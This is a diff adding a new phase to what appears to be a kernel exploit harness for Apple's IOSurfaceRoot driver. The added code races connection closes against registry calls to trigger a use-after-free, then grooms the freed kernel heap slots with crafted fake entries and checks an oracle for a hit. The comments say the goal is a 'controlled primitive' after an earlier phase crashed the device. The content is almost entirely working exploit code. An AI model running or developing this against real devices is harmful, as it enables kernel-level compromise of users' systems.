@@ -19298,6 +19298,296 @@ new_modes:
         phase13_done:
         rlog("--- Phase 13 complete ---\n");
 
+        /*
+         * Phase 14: Concurrent groom + race (controlled UAF)
+         *
+         * Phase 13 caused a watchdog reset — the race corrupted the registry
+         * and the GPU workloop hung in an infinite walk. To turn this into a
+         * controlled primitive, we groom CONCURRENTLY with the race so the
+         * kernel reads our fake entry (with NULL next pointer to terminate the
+         * walk) instead of corrupted data.
+         *
+         * The fake entry at kalloc.24:
+         *   +0x00: 0x1 (refcnt — keep alive, don't free)
+         *   +0x08: 0x0 (next pointer — NULL terminates linked list walk)
+         *   +0x10: 0x0 (zero — safe, no wild write)
+         *
+         * Process-level watchdog: self-terminate at 10s to prevent another
+         * hardware watchdog reset.
+         */
+        rlog("\n--- Phase 14: Concurrent groom + race (controlled UAF) ---\n");
+        {
+            /* Process watchdog — kill self before hardware watchdog fires */
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC),
+                dispatch_get_global_queue(0, 0), ^{
+                    rlog("  WATCHDOG: 10s limit — terminating to prevent device hang\n");
+                    if (g_log) { fclose(g_log); g_log = NULL; }
+                    _exit(42);
+                });
+
+            io_service_t svc14 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!svc14) { rlog("  Phase 14: service lookup failed\n"); goto phase14_done; }
+
+            int p14_shape = 1; /* known good from Phase 9 */
+
+            /* Open groom connection */
+            io_connect_t gc14 = IO_OBJECT_NULL;
+            if (IOServiceOpen(svc14, mach_task_self(), 0, &gc14) != KERN_SUCCESS) {
+                rlog("  Phase 14: groom conn failed\n");
+                goto phase14_done;
+            }
+
+            /* Start render loop */
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t render_th14;
+            pthread_create(&render_th14, NULL, p13_render_loop, NULL);
+            usleep(300000);
+            rlog("  Render loop running, frames=%d\n", p13_render_frames);
+
+            /* Test 14a: v_race8 with CONCURRENT grooming (safe fake entry) */
+            rlog("  14a: v_race8 + concurrent safe groom (5 iters)\n");
+            uint64_t inp14[3] = {1, 2, 3};
+            for (int iter = 0; iter < 5; iter++) {
+                io_connect_t cs[8];
+                int have[8];
+                for (int i = 0; i < 8; i++) {
+                    have[i] = (IOServiceOpen(svc14, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
+                    if (have[i]) {
+                        mach_port_t twp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                        mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0x1122334455667788ULL;
+                        IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
+                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), twp);
+                    } else cs[i] = IO_OBJECT_NULL;
+                }
+
+                /* Start spam */
+                p13_spam_run = 1;
+                p13_spam_conn = have[0] ? cs[0] : IO_OBJECT_NULL;
+                p13_spam_shape = p14_shape;
+                p13_spam_count = 0;
+                pthread_t spam_th14[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&spam_th14[t], NULL, p13_spam_reg, NULL);
+
+                /* Concurrent groomer: continuously fill freed 24-byte slots */
+                /* Safe fake entry: refcnt=1, next=NULL, data=0 */
+                uint8_t safe_fake[24];
+                memset(safe_fake, 0, sizeof(safe_fake));
+                uint64_t *sf = (uint64_t *)safe_fake;
+                sf[0] = 0x1; /* refcnt */
+                /* sf[1] = 0; next = NULL */
+                /* sf[2] = 0; data = 0 */
+
+                mach_port_t groom_wps[128];
+                int groom_n = 0;
+                uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+
+                /* Pre-groom: fill some slots before the close */
+                for (int g = 0; g < 64; g++) {
+                    mach_port_t gwp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                    mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                    IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref, 1,
+                        NULL, 0, safe_fake, 24, NULL, NULL, NULL, NULL);
+                    groom_wps[groom_n++] = gwp;
+                }
+
+                /* Staggered close — race window + interleaved groom */
+                for (int r = 0; r < 3; r++)
+                    for (int i = 0; i < 8; i++) {
+                        int j = (i * 5 + r * 3) % 8;
+                        if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
+                        /* Groom immediately after close to fill freed slots */
+                        for (int g = 0; g < 4 && groom_n < 128; g++) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                            IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref, 1,
+                                NULL, 0, safe_fake, 24, NULL, NULL, NULL, NULL);
+                            groom_wps[groom_n++] = gwp;
+                        }
+                        usleep(20 + (iter % 10) * 7);
+                    }
+
+                p13_spam_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(spam_th14[t], NULL);
+                for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
+
+                /* Check: did the dup oracle change during the race? */
+                io_connect_t oc = IO_OBJECT_NULL;
+                if (IOServiceOpen(svc14, mach_task_self(), 0, &oc) == KERN_SUCCESS) {
+                    mach_port_t owp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &owp);
+                    mach_port_insert_right(mach_task_self(), owp, owp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t oref = 0x1122334455667788ULL;
+                    kern_return_t r1 = IOConnectCallAsyncMethod(oc, 17, owp, &oref, 1,
+                        NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                    kern_return_t r2 = IOConnectCallAsyncMethod(oc, 17, owp, &oref, 1,
+                        NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                    kern_return_t r3 = IOConnectCallMethod(oc, 18, NULL, 0, inp14, 24,
+                        NULL, NULL, NULL, NULL);
+                    rlog("    14a[%d] spam=%llu groom=%d post: reg=0x%x dup=0x%x dereg=0x%x\n",
+                        iter, (unsigned long long)p13_spam_count, groom_n,
+                        (uint32_t)r1, (uint32_t)r2, (uint32_t)r3);
+                    IOServiceClose(oc);
+                    mach_port_deallocate(mach_task_self(), owp);
+                }
+
+                /* Free groom */
+                for (int g = 0; g < groom_n; g++)
+                    mach_port_deallocate(mach_task_self(), groom_wps[g]);
+                usleep(100000);
+            }
+
+            /* Test 14b: single connection rapid reg/dereg race with concurrent groom + render */
+            rlog("  14b: Rapid reg/dereg race + concurrent groom (10 iters)\n");
+            for (int iter = 0; iter < 10; iter++) {
+                io_connect_t rc = IO_OBJECT_NULL;
+                if (IOServiceOpen(svc14, mach_task_self(), 0, &rc) != KERN_SUCCESS) continue;
+
+                /* Register entry */
+                mach_port_t rwp = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rwp);
+                mach_port_insert_right(mach_task_self(), rwp, rwp, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t rref = 0x1122334455667788ULL;
+                IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
+                    NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+
+                /* Start spam on this connection */
+                p13_spam_run = 1;
+                p13_spam_conn = rc;
+                p13_spam_count = 0;
+                pthread_t spam_th14b[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&spam_th14b[t], NULL, p13_spam_reg, NULL);
+
+                /* Rapid dereg/re-reg cycle with interleaved groom */
+                uint8_t marker_fake[24];
+                memset(marker_fake, 0, sizeof(marker_fake));
+                uint64_t *mf = (uint64_t *)marker_fake;
+                mf[0] = 0x1;
+                mf[1] = 0xDEADFACE00000000ULL | (uint64_t)iter;
+                mf[2] = 0x0;
+
+                mach_port_t groom_wps14b[256];
+                int gn14b = 0;
+                uint64_t gref14b = 0xA1B2C3D4E5F60708ULL;
+
+                for (int r = 0; r < 20; r++) {
+                    IOConnectCallMethod(rc, 18, NULL, 0, inp14, 24,
+                        NULL, NULL, NULL, NULL);
+                    /* Immediately groom freed slot */
+                    if (gn14b < 256) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref14b, 1,
+                            NULL, 0, marker_fake, 24, NULL, NULL, NULL, NULL);
+                        groom_wps14b[gn14b++] = gwp;
+                    }
+                    IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
+                        NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                    usleep(50);
+                }
+
+                p13_spam_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(spam_th14b[t], NULL);
+
+                /* Oracle check: dup should return 0xC9 for live entry.
+                   If it returns something else, the race hit */
+                kern_return_t rdup = IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
+                    NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                kern_return_t rdereg = IOConnectCallMethod(rc, 18, NULL, 0, inp14, 24,
+                    NULL, NULL, NULL, NULL);
+                int anomaly = (rdup != 0 && rdup != (kern_return_t)0xE00002C9);
+                rlog("    14b[%d] spam=%llu groom=%d dup=0x%x dereg=0x%x %s\n",
+                    iter, (unsigned long long)p13_spam_count, gn14b,
+                    (uint32_t)rdup, (uint32_t)rdereg,
+                    anomaly ? "** ANOMALY **" : "normal");
+
+                IOServiceClose(rc);
+                mach_port_deallocate(mach_task_self(), rwp);
+                for (int g = 0; g < gn14b; g++)
+                    mach_port_deallocate(mach_task_self(), groom_wps14b[g]);
+                usleep(50000);
+            }
+
+            /* Test 14c: stale-read oracle DURING render loop (content-dependence recheck) */
+            rlog("  14c: Content-dependence oracle during render loop\n");
+            {
+                io_connect_t cc = IO_OBJECT_NULL;
+                if (IOServiceOpen(svc14, mach_task_self(), 0, &cc) == KERN_SUCCESS) {
+                    mach_port_t cwp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &cwp);
+                    mach_port_insert_right(mach_task_self(), cwp, cwp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t cref = 0x1122334455667788ULL;
+
+                    /* Test A: groom with marker=0xAABBCCDD */
+                    uint8_t fa[24]; memset(fa, 0, sizeof(fa));
+                    uint64_t *fap = (uint64_t *)fa;
+                    fap[0] = 0x21; fap[1] = 0xAABBCCDDEEFF0011ULL;
+                    int hits_a = 0;
+                    for (int i = 0; i < 5; i++) {
+                        IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
+                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                        IOConnectCallMethod(cc, 18, NULL, 0, inp14, 24,
+                            NULL, NULL, NULL, NULL);
+                        /* groom */
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref, 1,
+                            NULL, 0, fa, 24, NULL, NULL, NULL, NULL);
+                        kern_return_t rd = IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
+                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                        if (rd != (kern_return_t)0xE00002C9) hits_a++;
+                        mach_port_deallocate(mach_task_self(), gwp);
+                        usleep(2000);
+                    }
+
+                    /* Test B: groom with zero buffer */
+                    uint8_t fb[24]; memset(fb, 0, sizeof(fb));
+                    int hits_b = 0;
+                    for (int i = 0; i < 5; i++) {
+                        IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
+                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                        IOConnectCallMethod(cc, 18, NULL, 0, inp14, 24,
+                            NULL, NULL, NULL, NULL);
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref, 1,
+                            NULL, 0, fb, 24, NULL, NULL, NULL, NULL);
+                        kern_return_t rd = IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
+                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
+                        if (rd != (kern_return_t)0xE00002C9) hits_b++;
+                        mach_port_deallocate(mach_task_self(), gwp);
+                        usleep(2000);
+                    }
+
+                    rlog("    14c marker-groom hits=%d/5, zero-groom hits=%d/5 %s\n",
+                        hits_a, hits_b,
+                        (hits_a != hits_b) ? "** CONTENT-DEPENDENT **" : "(same = not content-dep)");
+                    IOServiceClose(cc);
+                    mach_port_deallocate(mach_task_self(), cwp);
+                }
+            }
+
+            /* Stop render loop */
+            p13_render_run = 0;
+            pthread_join(render_th14, NULL);
+            rlog("  Render loop stopped, frames=%d\n", p13_render_frames);
+            if (gc14) IOServiceClose(gc14);
+            IOObjectRelease(svc14);
+        }
+        phase14_done:
+        rlog("--- Phase 14 complete ---\n");
+
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
 
